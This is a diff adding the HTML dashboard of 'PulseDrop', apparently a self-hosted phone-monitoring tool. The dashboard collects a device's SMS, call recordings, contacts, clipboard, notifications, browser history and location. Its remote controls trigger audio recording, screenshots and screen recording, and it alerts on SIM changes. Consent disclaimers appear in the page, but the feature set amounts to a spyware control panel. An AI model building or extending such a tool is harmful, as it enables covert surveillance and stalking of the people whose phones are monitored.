@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PulseDrop Dashboard</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+</head>
+<body>
+    <div class="app-layout">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="logo">PulseDrop <span id="statusBadge" class="status-badge status-offline">Offline</span></div>
+            <div class="device-select">
+                <label>Device</label>
+                <select id="deviceSelect"></select>
+            </div>
+            <div class="nav-item active" data-tab="overview">Overview</div>
+            <div class="nav-item" data-tab="location">Location / Map</div>
+            <div class="nav-item" data-tab="sms">SMS Logs</div>
+            <div class="nav-item" data-tab="calls">Call Logs</div>
+            <div class="nav-item" data-tab="contacts">Contacts</div>
+            <div class="nav-item" data-tab="media">Media Gallery</div>
+            <div class="nav-item" data-tab="device-status">Device Status</div>
+            <div class="nav-item" data-tab="apps">Installed Apps</div>
+            <div class="nav-item" data-tab="notifications">Notifications</div>
+            <div class="nav-item" data-tab="clipboard">Clipboard</div>
+            <div class="nav-item" data-tab="browser">Browser History</div>
+            <div class="nav-item" data-tab="geofence">Geofence Alerts</div>
+            <div class="nav-item" data-tab="screen-recordings">Screen Recordings</div>
+            <div class="nav-item" data-tab="remote">Remote Control</div>
+            <div class="nav-item" data-tab="toggles">Feature Toggles</div>
+            <div class="nav-item" data-tab="settings">Settings</div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- SIM change alert -->
+            <div id="simAlert" class="alert-banner alert-sim" style="display:none;">
+                <span>⚠ SIM card change detected! <span id="simAlertText"></span></span>
+                <span class="alert-dismiss" onclick="document.getElementById('simAlert').style.display='none'">✕</span>
+            </div>
+
+            <!-- Overview -->
+            <div id="tab-overview" class="tab-content active">
+                <div class="page-header">
+                    <h2>Overview</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="refreshAll()">Refresh</button>
+                        <button class="btn btn-danger" onclick="logout()">Logout</button>
+                    </div>
+                </div>
+                <div class="info-grid" id="overviewStats"></div>
+                <div class="card" style="margin-top:16px;">
+                    <h3>Recent Activity</h3>
+                    <div id="recentActivity"></div>
+                </div>
+                <div class="card">
+                    <h3>⚠ Disclaimer</h3>
+                    <p style="font-size:12px;color:var(--text-dim);">
+                        PulseDrop is for personal testing on devices you own only. Monitoring devices you do not own without full consent is illegal.
+                        All data collection requires explicit permission grants from the device owner.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Location / Map -->
+            <div id="tab-location" class="tab-content">
+                <div class="page-header">
+                    <h2>Location History</h2>
+                    <div class="header-actions">
+                        <button class="btn btn-primary" onclick="sendCommand('pull_location')">Pull Location Now</button>
+                        <button class="btn" onclick="exportData('locations')">Export JSON</button>
+                        <button class="btn" onclick="exportData('locations','csv')">Export CSV</button>
+                    </div>
+                </div>
+                <div id="map"></div>
+                <div class="card" style="margin-top:16px;">
+                    <h3>Location Log</h3>
+                    <div style="max-height:300px;overflow-y:auto;">
+                        <table class="data-table" id="locationTable">
+                            <thead><tr><th>Time</th><th>Lat</th><th>Lon</th><th>Accuracy</th><th>Speed</th></tr></thead>
+                            <tbody></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SMS -->
+            <div id="tab-sms" class="tab-content">
+                <div class="page-header">
+                    <h2>SMS Logs</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="loadTab('sms')">Refresh</button>
+                        <button class="btn" onclick="exportData('sms')">Export JSON</button>
+                        <button class="btn" onclick="exportData('sms','csv')">Export CSV</button>
+                        <button class="btn btn-danger" onclick="deleteData('sms')">Delete All</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="smsTable">
+                        <thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Message</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Call Logs -->
+            <div id="tab-calls" class="tab-content">
+                <div class="page-header">
+                    <h2>Call Logs</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="loadTab('calls')">Refresh</button>
+                        <button class="btn" onclick="exportData('calls')">Export JSON</button>
+                        <button class="btn" onclick="exportData('calls','csv')">Export CSV</button>
+                        <button class="btn btn-danger" onclick="deleteData('calls')">Delete All</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="callsTable">
+                        <thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Contact</th><th>Duration</th><th>Recording</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Contacts -->
+            <div id="tab-contacts" class="tab-content">
+                <div class="page-header">
+                    <h2>Contacts</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="loadTab('contacts')">Refresh</button>
+                        <button class="btn" onclick="exportData('contacts')">Export JSON</button>
+                        <button class="btn" onclick="exportData('contacts','csv')">Export CSV</button>
+                        <button class="btn btn-danger" onclick="deleteData('contacts')">Delete All</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="contactsTable">
+                        <thead><tr><th>Name</th><th>Phones</th><th>Emails</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Media -->
+            <div id="tab-media" class="tab-content">
+                <div class="page-header">
+                    <h2>Media Gallery</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="loadTab('media')">Refresh</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="mediaTable">
+                        <thead><tr><th>Type</th><th>File Name</th><th>Size</th><th>Time</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Device Status -->
+            <div id="tab-device-status" class="tab-content">
+                <div class="page-header">
+                    <h2>Device Status</h2>
+                    <button class="btn" onclick="loadTab('device-status')">Refresh</button>
+                </div>
+                <div class="info-grid" id="deviceInfoGrid"></div>
+            </div>
+
+            <!-- Apps -->
+            <div id="tab-apps" class="tab-content">
+                <div class="page-header">
+                    <h2>Installed Apps</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="loadTab('apps')">Refresh</button>
+                        <button class="btn" onclick="exportData('apps')">Export JSON</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="appsTable">
+                        <thead><tr><th>App</th><th>Package</th><th>Version</th><th>System</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Notifications -->
+            <div id="tab-notifications" class="tab-content">
+                <div class="page-header">
+                    <h2>Notification Log</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="loadTab('notifications')">Refresh</button>
+                        <button class="btn" onclick="exportData('notifications')">Export JSON</button>
+                        <button class="btn btn-danger" onclick="deleteData('notifications')">Delete All</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="notificationsTable">
+                        <thead><tr><th>Time</th><th>App</th><th>Title</th><th>Text</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Clipboard -->
+            <div id="tab-clipboard" class="tab-content">
+                <div class="page-header">
+                    <h2>Clipboard Records</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="loadTab('clipboard')">Refresh</button>
+                        <button class="btn" onclick="exportData('clipboard')">Export JSON</button>
+                        <button class="btn btn-danger" onclick="deleteData('clipboard')">Delete All</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="clipboardTable">
+                        <thead><tr><th>Time</th><th>Content</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Browser -->
+            <div id="tab-browser" class="tab-content">
+                <div class="page-header">
+                    <h2>Browser History</h2>
+                    <div class="header-actions">
+                        <button class="btn" onclick="loadTab('browser-history')">History</button>
+                        <button class="btn" onclick="loadTab('browser-bookmarks')">Bookmarks</button>
+                        <button class="btn" onclick="exportData('browser-history')">Export JSON</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="browserTable">
+                        <thead><tr><th>Time</th><th>Title</th><th>URL</th><th>Visits</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Geofence -->
+            <div id="tab-geofence" class="tab-content">
+                <div class="page-header">
+                    <h2>Geofence Alerts</h2>
+                    <button class="btn" onclick="loadTab('geofence')">Refresh</button>
+                </div>
+                <div class="card">
+                    <table class="data-table" id="geofenceTable">
+                        <thead><tr><th>Time</th><th>Zone</th><th>Transition</th><th>Lat</th><th>Lon</th></tr></thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Screen Recordings -->
+            <div id="tab-screen-recordings" class="tab-content">
+                <div class="page-header">
+                    <h2>Screen Recordings</h2>
+                    <div class="header-actions">
+                        <button class="btn btn-primary" onclick="sendCommand('start_screen_record')">Start Recording</button>
+                        <button class="btn btn-danger" onclick="sendCommand('stop_screen_record')">Stop Recording</button>
+                        <button class="btn" onclick="loadTab('screen-recordings')">Refresh</button>
+                    </div>
+                </div>
+                <div id="screenRecordingsList"></div>
+            </div>
+
+            <!-- Remote Control -->
+            <div id="tab-remote" class="tab-content">
+                <div class="page-header">
+                    <h2>Remote Control</h2>
+                </div>
+                <div class="card">
+                    <h3>Send Command to Device</h3>
+                    <div class="remote-grid">
+                        <div class="remote-btn" onclick="sendCommand('pull_location')">
+                            <div class="icon">📍</div>
+                            <div class="label">Pull Location</div>
+                        </div>
+                        <div class="remote-btn" onclick="sendCommand('start_audio', {duration: 30})">
+                            <div class="icon">🎙️</div>
+                            <div class="label">Record 30s Audio</div>
+                        </div>
+                        <div class="remote-btn" onclick="sendCommand('stop_audio')">
+                            <div class="icon">⏹️</div>
+                            <div class="label">Stop Audio</div>
+                        </div>
+                        <div class="remote-btn" onclick="sendCommand('screenshot')">
+                            <div class="icon">📸</div>
+                            <div class="label">Screenshot</div>
+                        </div>
+                        <div class="remote-btn" onclick="sendCommand('start_screen_record')">
+                            <div class="icon">🎬</div>
+                            <div class="label">Start Screen Rec</div>
+                        </div>
+                        <div class="remote-btn" onclick="sendCommand('stop_screen_record')">
+                            <div class="icon">⏹️</div>
+                            <div class="label">Stop Screen Rec</div>
+                        </div>
+                        <div class="remote-btn" onclick="sendCommand('fetch_logs')">
+                            <div class="icon">📋</div>
+                            <div class="label">Fetch Latest Logs</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card">
+                    <h3>Command Response</h3>
+                    <pre id="commandResponse" style="background:var(--bg);padding:12px;border-radius:8px;min-height:60px;font-size:12px;white-space:pre-wrap;">Awaiting commands...</pre>
+                </div>
+            </div>
+
+            <!-- Feature Toggles -->
+            <div id="tab-toggles" class="tab-content">
+                <div class="page-header">
+                    <h2>Feature Toggles</h2>
+                    <button class="btn btn-primary" onclick="saveToggles()">Save & Push to Device</button>
+                </div>
+                <div class="card" id="togglesList"></div>
+            </div>
+
+            <!-- Settings -->
+            <div id="tab-settings" class="tab-content">
+                <div class="page-header"><h2>Settings</h2></div>
+                <div class="card">
+                    <h3>Data Management</h3>
+                    <p style="margin-bottom:12px;color:var(--text-dim);font-size:13px;">Delete collected data from the server.</p>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                        <button class="btn btn-danger btn-sm" onclick="deleteData('locations')">Delete Locations</button>
+                        <button class="btn btn-danger btn-sm" onclick="deleteData('sms')">Delete SMS</button>
+                        <button class="btn btn-danger btn-sm" onclick="deleteData('calls')">Delete Calls</button>
+                        <button class="btn btn-danger btn-sm" onclick="deleteData('contacts')">Delete Contacts</button>
+                        <button class="btn btn-danger btn-sm" onclick="deleteData('notifications')">Delete Notifications</button>
+                        <button class="btn btn-danger btn-sm" onclick="deleteData('clipboard')">Delete Clipboard</button>
+                        <button class="btn btn-danger btn-sm" onclick="deleteData('files')">Delete Files</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <h3>About</h3>
+                    <p style="font-size:13px;color:var(--text-dim);">
+                        PulseDrop v2.0 — Personal device telemetry for self-hosted testing on owned hardware.<br>
+                        No stealth mode. No exploits. All permissions require explicit user approval.
+                    </p>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Audio Player Modal -->
+    <div class="modal-overlay" id="audioModal">
+        <div class="modal">
+            <h3 id="audioModalTitle">Call Recording</h3>
+            <audio id="audioPlayer" controls></audio>
+            <div style="margin-bottom:12px;">
+                <select id="targetLang" class="btn">
+                    <option value="en">English</option>
+                    <option value="es">Spanish</option>
+                    <option value="fr">French</option>
+                    <option value="de">German</option>
+                    <option value="zh">Chinese</option>
+                    <option value="ar">Arabic</option>
+                    <option value="ha">Hausa</option>
+                    <option value="yo">Yoruba</option>
+                    <option value="ig">Igbo</option>
+                </select>
+                <button class="btn btn-primary btn-sm" onclick="transcribeCurrent()">Transcribe & Translate</button>
+            </div>
+            <div id="transcriptSection" style="display:none;">
+                <div class="transcript-label">Original Transcript <span id="transcriptLang"></span></div>
+                <div class="transcript-box" id="transcriptText"></div>
+                <div class="transcript-label">Translation</div>
+                <div class="transcript-box" id="translationText"></div>
+            </div>
+            <div style="text-align:right;margin-top:16px;">
+                <button class="btn" onclick="closeAudioModal()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="js/app.js"></script>
+</body>
+</html>
